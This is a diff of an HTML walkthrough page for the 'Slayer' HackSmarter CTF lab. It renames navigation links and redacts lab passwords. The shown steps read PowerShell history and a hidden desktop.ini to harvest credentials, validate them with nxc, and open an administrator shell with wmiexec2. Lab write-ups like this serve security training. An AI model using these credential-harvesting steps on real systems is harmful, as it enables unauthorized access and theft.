@@ -10,7 +10,7 @@
   <meta property="og:title" content="Slayer CTF Walkthrough - HackSmarter Labs | Z3rotrace" />
   <meta property="og:description" content="Windows privilege escalation via PowerShell history credential leak and service binary path manipulation. Two distinct paths to Administrator on Windows 11/Server 2025." />
   <meta property="og:image" content="https://z3rotrace.live/assets/slayer/root-flag-elevated.png" />
-  <meta property="og:url" content="https://z3rotrace.live/walkthroughs/slayer.html" />
+  <meta property="og:url" content="https://z3rotrace.live/HackSmarter/slayer.html" />
   <meta property="og:type" content="article" />
 
   <!-- Twitter Card tags -->
@@ -148,16 +148,16 @@
         </ul>
       </li>
       <li class="has-submenu">
-        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Machines Walkthroughs</button>
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>HackSmarter Labs</button>
         <ul class="submenu">
-          <li><a href="welcome.html">Welcome - ADCS ESC1</a></li>
-          <li><a href="staged.html">Staged - HackSmarter Labs</a></li>
-          <li><a href="buildingmagic.html">BuildingMagic - HackSmarter Labs</a></li>
-          <li><a href="arasaka.html">Arasaka - HackSmarter Labs</a></li>
-          <li><a href="midgarden2-badsuccessor.html">Midgarden2 - BadSuccessor</a></li>
-          <li><a href="banksmarter.html">BankSmarter - HackSmarter Labs</a></li>
-          <li><a href="ascension.html">Ascension - HackSmarter Labs</a></li>
-          <li><a href="slayer.html" aria-current="page">Slayer - HackSmarter Labs</a></li>
+          <li><a href="welcome.html">Welcome</a></li>
+          <li><a href="staged.html">Staged</a></li>
+          <li><a href="buildingmagic.html">BuildingMagic</a></li>
+          <li><a href="arasaka.html">Arasaka</a></li>
+          <li><a href="midgarden2-badsuccessor.html">Midgarden2</a></li>
+          <li><a href="banksmarter.html">BankSmarter</a></li>
+          <li><a href="ascension.html">Ascension</a></li>
+          <li><a href="slayer.html" aria-current="page">Slayer</a></li>
           <li><a href="anomaly.html">Anomaly</a></li>
           <li><a href="sharethepain.html">ShareThePain</a></li>
           <li><a href="sysco.html">Sysco</a></li>
@@ -292,7 +292,7 @@ SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  1002: EC2AMAZ-M1LFCNO\alice.
 
   <h3><span class="step">[Step 4]</span> RDP Access</h3>
   <p>With port 3389 open, I connected via RDP using the provided credentials:</p>
-  <pre><code>$ xfreerdp /u:tyler.ramsey /p:'P@ssw0rd!' /v:10.1.140.139</code></pre>
+  <pre><code>$ xfreerdp /u:tyler.ramsey /p:'[REDACTED]' /v:10.1.140.139</code></pre>
 
   <p><img src="../assets/slayer/rdp-session.png" alt="RDP session established as tyler.ramsey" loading="lazy"></p>
 
@@ -317,15 +317,15 @@ SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  1002: EC2AMAZ-M1LFCNO\alice.
 C:\Users\tyler.ramsey\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
 PS C:\> type C:\Users\tyler.ramsey\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-net user administrator "ebz0yxy3txh9BDE*yeh"</code></pre>
+net user administrator "[REDACTED]"</code></pre>
 
   <div class="key-finding">
-    <strong>Administrator password discovered:</strong> <code>ebz0yxy3txh9BDE*yeh</code>
+    <strong>Administrator password discovered:</strong> <code>[REDACTED]</code>
   </div>
 
   <h3><span class="step">[Step 6]</span> Validating Administrator Credentials</h3>
   <p>I verified the credentials work using NetExec:</p>
-  <pre><code>$ nxc smb 10.1.140.139 -u administrator -p 'ebz0yxy3txh9BDE*yeh'</code></pre>
+  <pre><code>$ nxc smb 10.1.140.139 -u administrator -p '[REDACTED]'</code></pre>
 
   <p><img src="../assets/slayer/admin-creds-validated.png" alt="Administrator credentials validated via SMB" loading="lazy"></p>
 
@@ -348,7 +348,7 @@ $ pip install setuptools</code></pre>
 
   <p><strong>Getting the root flag:</strong></p>
   <pre><code>$ ./wmiexec2.py EC2AMAZ-M1LFCNO/administrator@10.1.140.139
-Password: [ebz0yxy3txh9BDE*yeh]
+Password: [[REDACTED]]
 [*] SMBv3.0 dialect used
 [*] Launching wmiexec2
 [*] Press help for extra shell commands
@@ -399,10 +399,10 @@ Mode                 LastWriteTime         Length Name
   <p>The hidden <code>desktop.ini</code> file contains credentials:</p>
   <pre><code>PS C:\Management> type .\desktop.ini
 [.ShellClassInfo]
-InfoTip=CREDS: alice.wonderland:2wsxzaq1@WSXZAQ!</code></pre>
+InfoTip=CREDS: alice.wonderland:[REDACTED]</code></pre>
 
   <div class="key-finding">
-    <strong>New credentials discovered:</strong> <code>alice.wonderland:2wsxzaq1@WSXZAQ!</code>
+    <strong>New credentials discovered:</strong> <code>alice.wonderland:[REDACTED]</code>
   </div>
 
   <p>I used these credentials to establish a new RDP session as <code>alice.wonderland</code>.</p>
